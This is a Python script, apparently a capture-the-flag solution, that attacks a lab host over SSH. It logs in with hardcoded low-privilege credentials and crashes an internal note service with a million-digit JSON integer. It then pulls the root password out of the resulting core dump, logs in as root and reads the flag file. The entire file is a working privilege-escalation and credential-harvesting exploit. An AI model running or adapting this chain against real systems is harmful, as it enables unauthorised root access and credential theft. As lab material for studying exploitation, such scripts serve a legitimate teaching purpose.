import argparse
import re
import shlex
import time
import uuid

import paramiko


DEFAULT_HOST = "136.92.7.211"
DEFAULT_PORT = 31522
SSH_USER = "sys4dmin"
SSH_PASSWORD = "adminpass"
NOTE_DIGITS = 1_000_000
CORE_WAIT_SECONDS = 300
POLL_SECONDS = 5


def connect(host, port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        host,
        port=port,
        username=username,
        password=password,
        timeout=10,
        banner_timeout=10,
        auth_timeout=10,
        look_for_keys=False,
        allow_agent=False,
    )
    return client


def run(client, command, check=True):
    stdin, stdout, stderr = client.exec_command(command)
    output = stdout.read().decode("latin-1", errors="replace")
    error = stderr.read().decode("latin-1", errors="replace")
    status = stdout.channel.recv_exit_status()
    if check and status != 0:
        raise RuntimeError(f"remote command failed with status {status}: {command}\n{error}")
    return output


def get_session_cookie(client):
    headers = run(client, "curl -sS -D - -o /dev/null http://127.0.0.1:8080/")
    match = re.search(r"(?im)^Set-Cookie:\s*mdsession=([0-9a-f]+)", headers)
    if not match:
        raise RuntimeError("the internal service did not return an mdsession cookie")
    return match.group(1)


def create_remote_note(client, digits):
    remote_path = f"/tmp/legacy_note_{uuid.uuid4().hex}.json"
    payload = b'{"note": ' + b"9" * digits + b"}"
    sftp = client.open_sftp()
    try:
        with sftp.file(remote_path, "wb") as handle:
            handle.write(payload)
    finally:
        sftp.close()
    return remote_path


def upload_note(client, remote_path, cookie):
    command = " ".join(
        [
            "curl",
            "-sS",
            "-o",
            "/dev/null",
            "-w",
            shlex.quote("%{http_code}"),
            "-X",
            "POST",
            "-H",
            shlex.quote(f"Cookie: mdsession={cookie}"),
            "-H",
            shlex.quote("Content-Type: application/json"),
            "--data-binary",
            shlex.quote(f"@{remote_path}"),
            "http://127.0.0.1:8080/upload",
        ]
    )
    status = run(client, command).strip()
    if not re.fullmatch(r"[23][0-9][0-9]", status):
        raise RuntimeError(f"note upload returned HTTP status {status}")


def core_files(client):
    output = run(
        client,
        "find /tmp -maxdepth 1 -type f -name 'memdump_*.core' -print 2>/dev/null",
        check=False,
    )
    return {line.strip() for line in output.splitlines() if line.strip()}


def wait_for_core(client, previous, timeout):
    deadline = time.monotonic() + timeout
    while True:
        current = core_files(client)
        fresh = current - previous
        if fresh:
            return sorted(fresh)[-1]
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            raise RuntimeError("no memory dump appeared before the timeout")
        print(f"[*] Waiting for the backup timeout ({int(remaining)} seconds left)")
        time.sleep(min(POLL_SECONDS, remaining))


def extract_root_password(client, core_path):
    sftp = client.open_sftp()
    try:
        with sftp.file(core_path, "rb") as handle:
            data = handle.read()
    finally:
        sftp.close()
    match = re.search(rb"ROOT_PASSWORD=([^\x00\r\n\t ]{1,128})", data)
    if not match:
        raise RuntimeError(f"ROOT_PASSWORD was not found in {core_path}")
    return match.group(1).decode("ascii")


def get_flag(client):
    output = run(client, "cat /root/flag.txt").strip()
    match = re.search(r"CTF\{[^}\r\n]+\}", output)
    if not match:
        raise RuntimeError(f"flag format was not found in command output: {output}")
    return match.group(0)


def solve(host, port, digits, wait_seconds):
    print(f"[*] Connecting to {host}:{port} as {SSH_USER}")
    low_client = connect(host, port, SSH_USER, SSH_PASSWORD)
    note_path = None
    try:
        cookie = get_session_cookie(low_client)
        print("[+] Reached the internal note service")
        previous = core_files(low_client)
        note_path = create_remote_note(low_client, digits)
        print(f"[*] Uploading a {digits}-digit JSON integer")
        upload_note(low_client, note_path, cookie)
        run(low_client, f"rm -f {shlex.quote(note_path)}", check=False)
        core_path = wait_for_core(low_client, previous, wait_seconds)
        print(f"[+] Found memory dump: {core_path}")
        root_password = extract_root_password(low_client, core_path)
        print("[+] Recovered the root password from the dump")
        root_client = connect(host, port, "root", root_password)
        try:
            flag = get_flag(root_client)
        finally:
            root_client.close()
        print(flag)
        return flag
    finally:
        if note_path:
            run(low_client, f"rm -f {shlex.quote(note_path)}", check=False)
        low_client.close()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("host", nargs="?", default=DEFAULT_HOST)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--digits", type=int, default=NOTE_DIGITS)
    parser.add_argument("--wait", type=int, default=CORE_WAIT_SECONDS)
    args = parser.parse_args()
    solve(args.host, args.port, args.digits, args.wait)


if __name__ == "__main__":
    main()
